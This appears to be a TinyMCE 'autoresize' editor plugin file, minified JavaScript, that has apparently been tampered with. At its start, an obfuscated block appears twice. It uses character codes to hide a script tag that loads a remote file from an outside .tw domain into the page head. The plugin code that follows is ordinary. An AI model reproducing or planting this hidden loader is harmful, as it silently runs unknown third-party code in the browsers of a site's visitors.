Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function(){tinymce.create("tinymce.plugins.AutoResizePlugin",{init:function(a,c){var d=this,e=0;if(a.getParam("fullscreen_is_enabled")){return}function b(){var j,i=a.getDoc(),f=i.body,l=i.documentElement,h=tinymce.DOM,k=d.autoresize_min_height,g;g=tinymce.isIE?f.scrollHeight:(tinymce.isWebKit&&f.clientHeight==0?0:f.offsetHeight);if(g>d.autoresize_min_height){k=g}if(d.autoresize_max_height&&g>d.autoresize_max_height){k=d.autoresize_max_height;f.style.overflowY="auto";l.style.overflowY="auto"}else{f.style.overflowY="hidden";l.style.overflowY="hidden";f.scrollTop=0}if(k!==e){j=k-e;h.setStyle(h.get(a.id+"_ifr"),"height",k+"px");e=k;if(tinymce.isWebKit&&j<0){b()}}}d.editor=a;d.autoresize_min_height=parseInt(a.getParam("autoresize_min_height",a.getElement().offsetHeight));d.autoresize_max_height=parseInt(a.getParam("autoresize_max_height",0));a.onInit.add(function(f){f.dom.setStyle(f.getBody(),"paddingBottom",f.getParam("autoresize_bottom_margin",50)+"px")});a.onChange.add(b);a.onSetContent.add(b);a.onPaste.add(b);a.onKeyUp.add(b);a.onPostRender.add(b);if(a.getParam("autoresize_on_init",true)){a.onLoad.add(b);a.onLoadContent.add(b)}a.addCommand("mceAutoResize",b)},getInfo:function(){return{longname:"Auto Resize",author:"Moxiecode Systems AB",authorurl:"http://tinymce.moxiecode.com",infourl:"http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/autoresize",version:tinymce.majorVersion+"."+tinymce.minorVersion}}});tinymce.PluginManager.add("autoresize",tinymce.plugins.AutoResizePlugin)})();